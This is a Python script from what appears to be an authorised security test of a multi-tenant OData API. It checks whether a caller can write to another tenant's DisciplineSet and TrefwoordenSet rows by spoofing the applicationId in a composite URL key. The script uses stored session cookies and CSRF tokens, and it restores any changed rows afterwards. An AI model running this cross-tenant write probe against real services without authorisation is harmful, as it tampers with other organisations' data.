#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Track F — F5.1 — DisciplineSet / TrefwoordenSet composite-key cross-tenant.

HigherEducations (Track E follow-up) uses a singleton URL key `('0')` — the
server aliased `'0'` to the caller's tenant. Cross-tenant write was blocked
by URL scope, not by body-id inspection.

DisciplineSet and TrefwoordenSet use COMPOSITE URL keys of the form
`(applicationId='<x>',key='<y>')`. The `applicationId` is explicit in the
URL — not an alias. So the composite-key shape asks a different question:
does the server route by URL key literally (letting a caller specify any
applicationId), or does it enforce tenant scope on the URL key too?

Test plan (each single-op changeset, 8 s/req cadence):

  1. MERGE DisciplineSet(applicationId='000000503432',key='1') from A
       body: {applicationId:'000000503432', key:'1', disciplineCode:'F51_OWN'}
       Purpose: own-row control. Establishes the write path works.
  2. MERGE DisciplineSet(applicationId='000000503434',key='1') from A  <-- B's app id
       body: {applicationId:'000000503434', key:'1', disciplineCode:'F51_CROSS'}
       Purpose: cross-tenant probe via URL-key spoof + body match.
  3. Read from B's session: DisciplineSet?$filter=applicationId eq '000000503434'
       Purpose: did the cross-tenant write reach B's tenant?
  4. Same three-step probe for TrefwoordenSet.

Budget: 4 non-safe MERGEs + 4 direct GETs + up to 4 restore MERGEs
      = up to 8 non-safe. Under the 12 cap.

Cleanup mandatory: in `finally:` restore any row that got flipped. Read
both A's and B's collections to see what actually happened before halting.
"""
import argparse
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import authz_matrix as m

APP_A = "000000503432"
APP_B = "000000503434"


def batched_merge(client, session, entity_rel, body_dict, logger, note):
    body, boundary = m._batch_body(
        [], changeset=[("MERGE", entity_rel, body_dict)])
    r = client.request(session, "POST", "$batch", body=body,
                       extra_headers={"Content-Type":
                                      f"multipart/mixed; boundary={boundary}"},
                       note=note)
    inners = m._parse_batch_inner_statuses(r.get("text", ""))
    inner = inners[0] if inners else None
    logger.log("f5.1", entity_rel, "POST $batch", note, r,
               [f"outer={r.get('status')}", f"inner={inner}",
                f"body={json.dumps(body_dict)[:120]}"])
    return r.get("status"), inner, r.get("text", "")


def read_filtered_from(client, session, collection, applicationId, logger, note):
    path = f"{collection}?$filter=applicationId eq '{applicationId}'"
    r = m.read_entity(client, session, path, logger, "f5.1", note)
    try:
        return json.loads(r.get("text", "")).get("d", {}).get("results", [])
    except Exception:
        return []


def find_row(rows, key_value):
    for r in rows:
        if str(r.get("key")) == str(key_value):
            return r
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--min-interval", type=float, default=8.0)
    args = ap.parse_args()
    m.MIN_INTERVAL = args.min_interval
    print(f"[cadence] MIN_INTERVAL={m.MIN_INTERVAL}", file=sys.stderr)

    client = m.Client(dry_run=args.dry_run)
    logger = m.MatrixLogger(m.JSONL_PATH, dry_run=args.dry_run, append=True)

    if args.dry_run:
        sA = m.Session("A", "dry"); sA.csrf = "<dry>"
        sB = m.Session("B", "dry"); sB.csrf = "<dry>"
    else:
        sA = m.Session("A", m.load_cookie_header(m.CREDS_DIR + "/A.cookies"))
        sB = m.Session("B", m.load_cookie_header(m.CREDS_DIR + "/B.cookies"))
        client.fetch_csrf(sA)
        client.fetch_csrf(sB)

    landed_writes = []  # list of (collection, entity_rel, session, restore_body)
    verdicts = {}

    try:
        for collection, marker_field, own_marker, cross_marker in (
            ("DisciplineSet", "disciplineCode", "F51_OWN_DISC", "F51_CROSS_DISC"),
            ("TrefwoordenSet", "trefwoord",    "F51_OWN_TREF", "F51_CROSS_TREF"),
        ):
            # ---- OWN-ROW CONTROL (A writes to A's applicationId in URL) --
            own_entity = f"{collection}(applicationId='{APP_A}',key='1')"
            own_body = {"applicationId": APP_A, "key": "1", marker_field: own_marker}
            outer_o, inner_o, _ = batched_merge(client, sA, own_entity, own_body,
                                                logger, f"F5.1 OWN {collection}")

            rowsA = read_filtered_from(client, sA, collection, APP_A, logger,
                                        f"F5.1 verify A {collection}")
            a_row = find_row(rowsA, "1")
            a_own_landed = (a_row is not None
                            and str(a_row.get(marker_field)) == own_marker)
            logger.log("f5.1", own_entity, "COMPARE",
                       f"F5.1 own-control {collection}",
                       {"status": "n/a", "text": ""},
                       [f"outer={outer_o}", f"inner={inner_o}",
                        f"a_row_present={a_row is not None}",
                        f"a_marker_landed={a_own_landed}"])
            if a_own_landed:
                landed_writes.append((collection, own_entity, sA,
                                      {"applicationId": APP_A, "key": "1",
                                       marker_field: ""}))

            # ---- CROSS-TENANT PROBE (A writes B's applicationId in URL) --
            cross_entity = f"{collection}(applicationId='{APP_B}',key='1')"
            cross_body = {"applicationId": APP_B, "key": "1",
                           marker_field: cross_marker}
            outer_c, inner_c, _ = batched_merge(client, sA, cross_entity,
                                                 cross_body, logger,
                                                 f"F5.1 CROSS {collection}")

            # Read from BOTH A and B to see where (if anywhere) the write landed
            rowsA_after = read_filtered_from(client, sA, collection, APP_A,
                                              logger,
                                              f"F5.1 post-cross A read {collection}")
            rowsB_after = read_filtered_from(client, sB, collection, APP_B,
                                              logger,
                                              f"F5.1 post-cross B read {collection}")
            a_row_after = find_row(rowsA_after, "1")
            b_row_after = find_row(rowsB_after, "1")
            a_has_cross_marker = (a_row_after is not None
                                  and str(a_row_after.get(marker_field)) == cross_marker)
            b_has_cross_marker = (b_row_after is not None
                                  and str(b_row_after.get(marker_field)) == cross_marker)

            # Verdict discrimination
            if b_has_cross_marker:
                verdict = "CROSS_TENANT_WRITE_CROWN_JEWEL"
            elif a_has_cross_marker:
                verdict = "WRITTEN_TO_A_INSTEAD_URL_KEY_IGNORED"
            elif inner_c in (200, 202, 204):
                verdict = "WRITE_ACCEPTED_BUT_NO_ROW_CHANGE"
            elif inner_c == 403:
                verdict = "AUTHZ_REJECTED_403"
            elif inner_c in (501,):
                verdict = "NOT_IMPLEMENTED_501"
            else:
                verdict = f"UNCLASSIFIED_inner={inner_c}"

            flags = [f"outer={outer_c}", f"inner={inner_c}",
                     f"a_has_marker={a_has_cross_marker}",
                     f"b_has_marker={b_has_cross_marker}",
                     f"VERDICT={verdict}"]
            if verdict == "CROSS_TENANT_WRITE_CROWN_JEWEL":
                flags.append("ANOMALY_composite_key_cross_tenant_write")
            logger.log("f5.1", cross_entity, "COMPARE",
                       f"F5.1 cross-tenant {collection}",
                       {"status": "n/a", "text": ""}, flags)
            verdicts[collection] = verdict

            if a_has_cross_marker:
                landed_writes.append((collection, own_entity, sA,
                                      {"applicationId": APP_A, "key": "1",
                                       marker_field: ""}))
            if b_has_cross_marker:
                landed_writes.append((collection, cross_entity, sB,
                                      {"applicationId": APP_B, "key": "1",
                                       marker_field: ""}))
                print(f"[HALT] CROWN JEWEL: cross-tenant write on {collection} "
                      f"— halting further phases for restore + writeup",
                      file=sys.stderr)
                break

    finally:
        for collection, entity, session, restore_body in landed_writes:
            outer_r, inner_r, _ = batched_merge(client, session, entity,
                                                 restore_body, logger,
                                                 f"F5.1 RESTORE {collection}")
            rv = read_filtered_from(client, session, collection,
                                     restore_body["applicationId"], logger,
                                     f"F5.1 verify restore {collection}")
            row = find_row(rv, restore_body["key"])
            observed = row.get(list(restore_body.keys())[-1]) if row else None
            ok = (observed in ("", None))
            logger.log("f5.1", entity, "CLEANUP_VERIFY",
                       f"{collection} ok={ok}",
                       {"status": "n/a", "text": ""},
                       [f"cleanup_ok={ok}",
                        f"restore_inner={inner_r}",
                        f"observed={observed!r}"])

    print("\n=== F5.1 SUMMARY ===", file=sys.stderr)
    any_hit = False
    for collection, verdict in verdicts.items():
        marker = " ⚠ ANOMALY" if verdict == "CROSS_TENANT_WRITE_CROWN_JEWEL" else ""
        print(f"  {collection:<20} verdict={verdict}{marker}", file=sys.stderr)
        if verdict == "CROSS_TENANT_WRITE_CROWN_JEWEL":
            any_hit = True
    print(f"\n[VERDICT] composite_key_cross_tenant_write={any_hit}",
          file=sys.stderr)
    return 0 if not any_hit else 1


if __name__ == "__main__":
    sys.exit(main())
